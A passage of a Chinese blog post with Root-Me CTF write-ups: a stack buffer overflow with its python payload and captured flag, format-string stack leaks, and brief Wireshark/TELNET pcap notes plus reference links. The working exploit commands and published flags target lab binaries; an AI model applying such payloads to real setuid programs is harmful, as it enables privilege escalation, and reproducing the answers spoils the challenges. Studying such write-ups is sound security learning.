load pubkey <span class="s2">"/dev/null/.ssh/id_xmss"</span>: Not a directory
      _           _ _                        ___ ____
  ___| |__   __ _| | | ___ _ __   __ _  ___ / _ <span class="se">\_</span>__ <span class="se">\</span>
 / __| <span class="s1">'_ \ / _` | | |/ _ \ '</span>_ <span class="se">\ </span>/ _<span class="sb">`</span> |/ _ <span class="se">\ </span>| | |__<span class="o">)</span> |
| <span class="o">(</span>__| | | | <span class="o">(</span>_| | | |  __/ | | | <span class="o">(</span>_| |  __/ |_| / __/
 <span class="se">\_</span>__|_| |_|<span class="se">\_</span>_,_|_|_|<span class="se">\_</span>__|_| |_|<span class="se">\_</span>_, |<span class="se">\_</span>__|<span class="se">\_</span>__/_____|
                                 |___/ root-me.org

                                     ██▒ ▒██░
                                 ░███░ █ █ ░███▒
                             ░███░        ▓     ███░
                           ▓█▓       ▓█░  ▓       ▓███
                         ██▒     ░▓█▓███  ▓   ██  █▒ ░██
                        ██  ███  ▒░       ▓░████░██    ▓█░
                       ██   ▒██      ███      ░▓██      ▒█
                      ██             ░█░      ░██        ▓█
                     ░█████████████    █     ██░          █▓
                     ██                 █ ░██             ██
                     ██      ░         ░██▓               ██
                     ██  ███    ░██▓░███                 ███
                     ▒█          ▓██▓                  ░████
                      █▓    ░████                    ░██ ▒█
                      ▓█████░                      ███ ███▓
                      ▓███                      █████░ ████
                       ▓█     ░██▓░         ▒████████░  ██
                       ▓█      ██░▒██████████████████░  ██
                       ▓█       ███▓██▒  ░██████████░   ██
                       ▓█                  ░████▒       ██
                        ░██▓           ▒█▓           ▒██░
                           ▒██░       ██ ▒█        ██▓
                              █▒                  █
                              █▒  ░█    █░   █▓   █
                              █████████████████████

 ████████████▄                             ██    ███             ███
 ██          ██  ▄████████▄   ▄████████▄  ██████ ████           ████  ▄████████▄

 ██          ██ ██        ██ ██        ██  ██    ██  ██       ██  ██ ██        █
█
 ████████████▀  ██        ██ ██        ██  ██    ██   ██     ██   ██ ███████████
█
 ██    ███      ██        ██ ██        ██  ██    ██     ██ ██     ██ ██
 ██       ████   ▀████████▀   ▀████████▀   ██    ██       █       ██  ▀█████████
█
<span class="nt">--------------------------------------------------------------------------------</span>
<span class="nt">----------------</span>

    Welcome on challenge02    /

<span class="nt">-----------------------------</span>‘

/tmp and /var/tmp are writeable

Validation password is stored <span class="k">in</span> <span class="nv">$HOME</span>/.passwd

Useful commands available:
    python, perl, gcc, netcat, gdb, gdb-peda, gdb-gef, gdb-pwndbg, ROPgadget, ra
dare2

Attention:
    Publishing solutions publicly <span class="o">(</span>blog, github, youtube, etc.<span class="o">)</span> is forbidden.
    Publier des solutions publiquement <span class="o">(</span>blog, github, youtube, etc.<span class="o">)</span> est interdi
t.

<span class="nt">--------------------------------------------------------------------------------</span>
<span class="nt">----------------</span>

    Challenge informations   /

<span class="nt">----------------------------</span>‘

./ch13: setuid ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamic
ally linked, interpreter /lib/ld-linux.so.2, <span class="k">for </span>GNU/Linux 3.2.0, BuildID[sha1]<span class="o">=</span>
d2ae5f2bb448364a35f8abfc3d07ce36d5c8f230, not stripped
libc: GNU C Library <span class="o">(</span>Ubuntu GLIBC 2.27-3ubuntu1.4<span class="o">)</span> stable release version 2.27.

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPA
TH      Symbols                 FORTIFY         Fortified       Fortifiable  FIL
E
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RU
NPATH   70 Symbols     No       0               2       ./ch13

ASLR is OFF

app-systeme-ch13@challenge02:~<span class="err">$</span>

</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>app-systeme-ch13@challenge02:~<span class="nv">$ </span>ll
total 28
dr-xr-x---  2 app-systeme-ch13-cracked app-systeme-ch13 4096 May 19  2019 ./
drwxr-xr-x 18 root                     root             4096 Mar 17  2018 ../
<span class="nt">-r--------</span>  1 app-systeme-ch13-cracked app-systeme-ch13   17 Mar 18  2015 .passwd
<span class="nt">-r--r-----</span>  1 app-systeme-ch13-cracked app-systeme-ch13  537 May 19  2019 Makefile
<span class="nt">-r-sr-x---</span>  1 app-systeme-ch13-cracked app-systeme-ch13 7360 May 19  2019 ch13<span class="k">*</span>
<span class="nt">-r--r-----</span>  1 app-systeme-ch13-cracked app-systeme-ch13  555 May 19  2019 ch13.c
</pre></table></code></div></div><div class="language-c highlighter-rouge"><div class="code-header" text-data="c"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span> 
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
 
  <span class="kt">int</span> <span class="n">var</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">check</span> <span class="o">=</span> <span class="mh">0x04030201</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
 
  <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
 
  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[buf]: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"[check] %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">check</span><span class="p">);</span>
 
  <span class="k">if</span> <span class="p">((</span><span class="n">check</span> <span class="o">!=</span> <span class="mh">0x04030201</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">check</span> <span class="o">!=</span> <span class="mh">0xdeadbeef</span><span class="p">))</span>
    <span class="n">printf</span> <span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">You are on the right way!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
 
  <span class="k">if</span> <span class="p">(</span><span class="n">check</span> <span class="o">==</span> <span class="mh">0xdeadbeef</span><span class="p">)</span>
   <span class="p">{</span>
     <span class="n">printf</span><span class="p">(</span><span class="s">"Yeah dude! You win!</span><span class="se">\n</span><span class="s">Opening your shell...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
     <span class="n">setreuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span>
     <span class="n">system</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">);</span>
     <span class="n">printf</span><span class="p">(</span><span class="s">"Shell closed! Bye.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
   <span class="p">}</span>
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><div class="language-sh highlighter-rouge"><div class="code-header" text-data="sh"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>app-systeme-ch13@challenge02:~<span class="nv">$ </span>python
Python 2.7.17 <span class="o">(</span>default, Feb 27 2021, 15:10:58<span class="o">)</span>
<span class="o">[</span>GCC 7.5.0] on linux2
Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
<span class="o">&gt;&gt;&gt;</span>
</pre></table></code></div></div><p>```python 2.7</p><blockquote><blockquote><blockquote><p>print “\xef\xbe\xad\xde” ﾭÞ ```</p></blockquote></blockquote></blockquote><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>app-systeme-ch13@challenge02:~<span class="nv">$ </span>python <span class="nt">-c</span> <span class="s1">'print "a"*40+"\xef\xbe\xad\xde" + "\x00"*4052 + "cat .passwd"'</span> | ./ch13

<span class="o">[</span>buf]: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭÞ
<span class="o">[</span>check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
1w4ntm0r3pr0np1s
Shell closed! Bye.
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>app-systeme-ch13@challenge02:~<span class="nv">$ </span><span class="o">(</span>python <span class="nt">-c</span> <span class="s1">'print "a"*40+"\xef\xbe\xad\xde" '</span><span class="p">;</span> <span class="nb">cat</span> <span class="o">)</span> | ./ch13

<span class="o">[</span>buf]: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭÞ
<span class="o">[</span>check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
<span class="nb">cat</span> .passwd
1w4ntm0r3pr0np1s
^CShell closed! Bye.

app-systeme-ch13@challenge02:~<span class="err">$</span>

</pre></table></code></div></div><p>这个方法不对</p><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>app-systeme-ch13@challenge02:~<span class="nv">$ </span>./ch13
0000000000000000000000000000000000000000ﾭÞ

<span class="o">[</span>buf]: 0000000000000000000000000000000000000000ﾭÃ
<span class="o">[</span>check] 0xc3adbeef

You are on the right way!
app-systeme-ch13@challenge02:~<span class="err">$</span>

<span class="nb">cat</span> .passwd
</pre></table></code></div></div><p>原因在于手打的 ﾭÞ 无法被正确转义，</p><div class="language-sh highlighter-rouge"><div class="code-header" text-data="sh"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>app-systeme-ch13@challenge02:~<span class="nv">$ </span>0000000000000000000000000000000000000000ﾭÞ
WARNING:root:could not open file <span class="s1">'/etc/apt/sources.list.d/nodesource.list'</span>

0000000000000000000000000000000000000000<span class="se">\u</span>dcef<span class="se">\u</span>dcbe<span class="se">\u</span>dcad<span class="se">\u</span>dcc3<span class="se">\u</span>dc9e: <span class="nb">command </span>not found
app-systeme-ch13@challenge02:~<span class="err">$</span>
</pre></table></code></div></div><p>直接被识别成五个字符了，所以用 python 比较靠谱。</p><h2 id="elf-x86---format-string-bug-basic-1">ELF x86 - Format string bug basic 1</h2><div class="language-shell highlighter-rouge"><div class="code-header" text-data="shell"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
</pre><td class="rouge-code"><pre><span class="o">[</span>Press Shift-F1 <span class="k">for </span><span class="nb">help</span><span class="o">]</span>

Host/IP or ssh:// URL <span class="o">[</span>localhost]: ssh://app-systeme-ch5:app-systeme-ch5@challen
ge02
Connecting to ssh://app-systeme-ch5@challenge02:22

load pubkey <span class="s2">"/dev/null/.ssh/id_rsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_rsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_dsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_dsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ecdsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ecdsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ecdsa_sk"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ecdsa_sk"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ed25519"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ed25519"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ed25519_sk"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ed25519_sk"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_xmss"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_xmss"</span>: Not a directory
      _           _ _                        ___ ____
  ___| |__   __ _| | | ___ _ __   __ _  ___ / _ <span class="se">\_</span>__ <span class="se">\</span>
 / __| <span class="s1">'_ \ / _` | | |/ _ \ '</span>_ <span class="se">\ </span>/ _<span class="sb">`</span> |/ _ <span class="se">\ </span>| | |__<span class="o">)</span> |
| <span class="o">(</span>__| | | | <span class="o">(</span>_| | | |  __/ | | | <span class="o">(</span>_| |  __/ |_| / __/
 <span class="se">\_</span>__|_| |_|<span class="se">\_</span>_,_|_|_|<span class="se">\_</span>__|_| |_|<span class="se">\_</span>_, |<span class="se">\_</span>__|<span class="se">\_</span>__/_____|
                                 |___/ root-me.org

                                     ██▒ ▒██░
                                 ░███░ █ █ ░███▒
                             ░███░        ▓     ███░
                           ▓█▓       ▓█░  ▓       ▓███
                         ██▒     ░▓█▓███  ▓   ██  █▒ ░██
                        ██  ███  ▒░       ▓░████░██    ▓█░
                       ██   ▒██      ███      ░▓██      ▒█
                      ██             ░█░      ░██        ▓█
                     ░█████████████    █     ██░          █▓
                     ██                 █ ░██             ██
                     ██      ░         ░██▓               ██
                     ██  ███    ░██▓░███                 ███
                     ▒█          ▓██▓                  ░████
                      █▓    ░████                    ░██ ▒█
                      ▓█████░                      ███ ███▓
                      ▓███                      █████░ ████
                       ▓█     ░██▓░         ▒████████░  ██
                       ▓█      ██░▒██████████████████░  ██
                       ▓█       ███▓██▒  ░██████████░   ██
                       ▓█                  ░████▒       ██
                        ░██▓           ▒█▓           ▒██░
                           ▒██░       ██ ▒█        ██▓
                              █▒                  █
                              █▒  ░█    █░   █▓   █
                              █████████████████████

 ████████████▄                             ██    ███             ███
 ██          ██  ▄████████▄   ▄████████▄  ██████ ████           ████  ▄████████▄

 ██          ██ ██        ██ ██        ██  ██    ██  ██       ██  ██ ██        █
█
 ████████████▀  ██        ██ ██        ██  ██    ██   ██     ██   ██ ███████████
█
 ██    ███      ██        ██ ██        ██  ██    ██     ██ ██     ██ ██
 ██       ████   ▀████████▀   ▀████████▀   ██    ██       █       ██  ▀█████████
█

<span class="nt">--------------------------------------------------------------------------------</span>
<span class="nt">----------------</span>

    Welcome on challenge02    /

<span class="nt">-----------------------------</span>‘

/tmp and /var/tmp are writeable

Validation password is stored <span class="k">in</span> <span class="nv">$HOME</span>/.passwd

Useful commands available:
    python, perl, gcc, netcat, gdb, gdb-peda, gdb-gef, gdb-pwndbg, ROPgadget, ra
dare2

Attention:
    Publishing solutions publicly <span class="o">(</span>blog, github, youtube, etc.<span class="o">)</span> is forbidden.
    Publier des solutions publiquement <span class="o">(</span>blog, github, youtube, etc.<span class="o">)</span> est interdi
t.

<span class="nt">--------------------------------------------------------------------------------</span>
<span class="nt">----------------</span>

    Challenge informations   /

<span class="nt">----------------------------</span>‘

./ch5: setuid ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamica
lly linked, interpreter /lib/ld-linux.so.2, <span class="k">for </span>GNU/Linux 3.2.0, BuildID[sha1]<span class="o">=</span>b
c45458fd23fb2c00bd069a9755569b89d35640a, not stripped
libc: GNU C Library <span class="o">(</span>Ubuntu GLIBC 2.27-3ubuntu1.4<span class="o">)</span> stable release version 2.27.

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPA
TH      Symbols                 FORTIFY         Fortified       Fortifiable  FIL
E
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RU
NPATH   69 Symbols     Yes      0               2       ./ch5

ASLR is OFF

app-systeme-ch5@challenge02:~<span class="err">$</span>
</pre></table></code></div></div><div class="language-sh highlighter-rouge"><div class="code-header" text-data="sh"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>app-systeme-ch5@challenge02:~<span class="nv">$ </span>ll
total 28
dr-xr-x---  2 app-systeme-ch5-cracked app-systeme-ch5 4096 May 19  2019 ./
drwxr-xr-x 18 root                    root            4096 Mar 17  2018 ../
<span class="nt">-r--------</span>  1 app-systeme-ch5-cracked app-systeme-ch5   14 Feb  8  2012 .passwd
<span class="nt">-r--r-----</span>  1 app-systeme-ch5-cracked app-systeme-ch5  507 May 19  2019 Makefile
<span class="nt">-r-sr-x---</span>  1 app-systeme-ch5-cracked app-systeme-ch5 7336 May 19  2019 ch5<span class="k">*</span>
<span class="nt">-r--r-----</span>  1 app-systeme-ch5-cracked app-systeme-ch5  247 May 25  2015 ch5.c
</pre></table></code></div></div><div class="language-c highlighter-rouge"><div class="code-header" text-data="c"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span> 
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
        <span class="kt">FILE</span> <span class="o">*</span><span class="n">secret</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"/challenge/app-systeme/ch5/.passwd"</span><span class="p">,</span> <span class="s">"rt"</span><span class="p">);</span>
        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
        <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">secret</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="n">fclose</span><span class="p">(</span><span class="n">secret</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><div class="language-sh highlighter-rouge"><div class="code-header" text-data="sh"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>app-systeme-ch5@challenge02:~<span class="nv">$ </span>./ch5 %x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x
20,804b160,804853d,9,bffffd38,b7e1b589,bffffc14,b7fc3000,b7fc3000,804b160,39617044,28293664,6d617045,bf000a64,804861b
app-systeme-ch5@challenge02:~<span class="err">$</span>
</pre></table></code></div></div><div class="language-sh highlighter-rouge"><div class="code-header" text-data="sh"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>app-systeme-ch5@challenge02:~<span class="nv">$ </span>./ch5 <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print "%08x."*32'</span><span class="si">)</span>
00000020.0804b160.0804853d.00000009.bffffcc4.b7e1b589.bffffba4.b7fc3000.
b7fc3000.0804b160.39617044.28293664.6d617045.bf000a64.0804861b.00000002.
bffffba4.bffffbb0.c058f800.bffffb10.00000000.00000000.b7e03f21.b7fc3000.
b7fc3000.00000000.b7e03f21.00000002.bffffba4.bffffbb0.bffffb34.00000001.
app-systeme-ch5@challenge02:~<span class="err">$</span>
</pre></table></code></div></div><p>大小端转换</p><p>9apD()6dmapE Dpa9d6)(Epam</p><p>http://showlinkroom.me/2017/01/28/pwn-learn-printf/</p><p>https://blog.csdn.net/qq_29687403/article/details/46953121</p><p>https://1993-constant.tistory.com/513</p><p>https://codeby.net/threads/root-me-app-system-elf-x86-format-string-bug-basic-1.67942/</p><p>https://itszzz.top/2019/04/12/format-string-bug/#the-format-function-family</p><p>大小端 https://www.jianshu.com/p/a147d486c04c</p><h1 id="réseau">Réseau</h1><h2 id="ip---time-to-live">IP - Time To Live</h2><p>Énoncé Retrouvez le TTL employé pour atteindre l’hote ciblé par cet échange de paquets ICMP.</p><p>开始这个题目会下载一个名为 ch7.pcap 文件，经查为网络数据包，需要专业工具来打开。</p><p>网上比较推荐 wireshark 这种专业工具，去 <a href="https://www.wireshark.org/#download">Wireshark 官网</a>下载即可，按照步骤安装下来，程序整体比较小。</p><p>同时安装程序会告诉你 Wireshark 需要 Npcap 来网络流量抓包，询问你是否需要安装， 以及是否需要装 USBPcap 用于 USB 流量抓包。有需要可以选择安装。</p><p>https://medium.com/blacksecurity/root-me-ip-time-to-live-write-up-492ca954ea6b</p><p>https://ivanitlearning.wordpress.com/2019/02/12/root-me-ip-determine-ttl/</p><h2 id="telnet---authentification">TELNET - authentification</h2><p>Énoncé Retrouvez le mot de passe de l’utilisateur dans cette capture réseau de session TELNET.</p><p>这次文件的名字为 ch2.pcap, 同样用 wireshark 打开解析。</p><p>右键 -&gt; 追踪流 -&gt; TCP 流</p><p>可以看到内容 Password:user</p><p>成功</p><p>https://medium.com/secttp/root-me-network-telnet-authentication-1198f2af3efe</p><h1 id="programmation">Programmation</h1><h2 id="quick-response-code">Quick Response Code</h2><p>https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/rootme/Programming/%5B09%5D%20%5B40P%5D%20Quick%20Response%20Code</p><h1 id="cracking">Cracking</h1><h2 id="bash---vm">Bash - VM</h2><p>提示语 MaSHine Virtuelle</p><p>Énoncé Retrouvez le mot de passe de validation stocké dans cette machine virtuelle Bash.</p><p>官方参考： <a href="http://repository.root-me.org/Programmation/Shell/FR%20-%20Introduction%20%C3%A0%20la%20Programmation%20en%20Bash.pdf">Introduction à la Programmation en Bash</a></p><h1 id="参考网站">参考网站</h1><p>https://pipedream.com/requestbin</p><p>https://blog.csdn.net/lyy289065406/article/details/86446176</p><p>https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/rootme/Web-Client</p><p>https://challenge-friang.gitbook.io/challenge-brigitte-friang/</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/blogging/'>Blogging</a>, <a href='/categories/study/'>Study</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/cyber-security/" class="post-tag no-text-decoration" >Cyber-security</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=专业课 - 信息安全 - 在 ROOT ME 平台上挑战信息安全项目 - Stone SHI&url=/posts/MSI-cyber-security/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=专业课 - 信息安全 - 在 ROOT ME 平台上挑战信息安全项目 - Stone SHI&u=/posts/MSI-cyber-security/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=专业课 - 信息安全 - 在 ROOT ME 平台上挑战信息安全项目 - Stone SHI&url=/posts/MSI-cyber-security/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', '')" data-toggle="tooltip" data-placement="top" title=""> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/LeetCode_daily_challenge/">LeetCode 刷题记录 - 每日一题</a><li><a href="/posts/LeetCode_backtrack/">LeetCode 刷题记录 - 回溯算法</a><li><a href="/posts/LeetCode_dynamic_programming/">LeetCode 刷题记录 - Dynamic Programming</a><li><a href="/posts/Machine-Learning/">Machine Learning - ESMI_MES-08 - Apprentissage artificiel</a><li><a href="/posts/LeetCode_graph/">LeetCode 刷题记录 - 数据结构之图（Graph）</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/leetcode/">LeetCode</a> <a class="post-tag" href="/tags/block-chain/">Block chain</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/parser/">Parser</a> <a class="post-tag" href="/tags/python/">Python</a> <a class="post-tag" href="/tags/backend/">Backend</a> <a class="post-tag" href="/tags/blog/">Blog</a> <a class="post-tag" href="/tags/compilation/">Compilation</a> <a class="post-tag" href="/tags/functional-programming/">Functional Programming</a> <a class="post-tag" href="/tags/java/">Java</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/MSI-Functional-programming/"><div class="card-body"> <span class="timeago small" >Sep 23, 2021<i class="unloaded">2021-09-23T04:58:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>专业课 - 函数式编程小项目 - 基于Haskell编写的算术表达式语法分析器</h3><div class="text-muted small"><p> 2021年9月21日，星期二，专业周第一天，讲函数式编程并且基于 Hakell 编写一个用于算术表达式的语法分析器 函数式编程 Haskell 语法分析器 Parser 项目：基于 Hakell 的算术表达式语法分析器 1. 环境搭建 环境搭建没有讲，用的是老师拷给我们的镜像，里面有安装好的 Haskell ， 有机会还是要自己研究一下。 2. 下载并测试文件 将文件全部下载...</p></div></div></a></div><div class="card"> <a href="/posts/MSI-System-Programming-TP2/"><div class="card-body"> <span class="timeago small" >Sep 23, 2021<i class="unloaded">2021-09-23T04:58:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>专业课 - 系统编程项目二 - 使用 C 语言编写一个 Linux 的 Mini shell</h3><div class="text-muted small"><p> 2021年9月22日，星期三，专业周第二天，讲操作系统和系统编程。 老师在下午布置了两个小项目，第一个是使用 Buildroot 来编译一个 Linux 内核，第二个是使用 C 语言编写一个 Linux 的 Mini shell。 这篇 blog 主要讲第二个项目，第一个项目链接在此。 Shell 项目：使用 C 语言编写一个 Linux 的 Mini shell 1. 环境搭建 ...</p></div></div></a></div><div class="card"> <a href="/posts/MSI-System-Programming-TP1/"><div class="card-body"> <span class="timeago small" >Sep 23, 2021<i class="unloaded">2021-09-23T05:11:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>专业课 - 系统编程项目一 - 使用 Buildroot 编译 Linux 内核</h3><div class="text-muted small"><p> 2021年9月22日，星期三，专业周第二天，讲操作系统和系统编程。 老师在下午布置了两个小项目，第一个是使用 Buildroot 来编译一个 Linux 内核，第二个是使用 C 语言编写一个 Linux 的 Mini shell。 这篇 blog 主要讲第一个项目，第二个项目链接在此。 操作系统 Linux 系统 Buildroot 这个东西的意义在于帮助你制作一个 Linux 镜...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/MSI-compilation_front_end_of_compiler/" class="btn btn-outline-primary" prompt="Older"><p>专业课 